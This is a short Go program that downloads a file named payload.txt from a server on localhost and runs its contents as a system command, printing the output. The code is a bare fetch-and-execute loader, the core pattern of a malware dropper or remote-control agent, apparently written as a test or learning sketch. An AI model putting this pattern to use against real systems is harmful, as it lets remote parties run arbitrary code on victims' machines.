package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
)

func main() {

	resp, err := http.Get("http://localhost:8080/payload.txt")

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	// fmt.Println(string(body))
	fmt.Println("Running command: " + string(body))
	out, err := exec.Command(string(body)).Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(out))
}
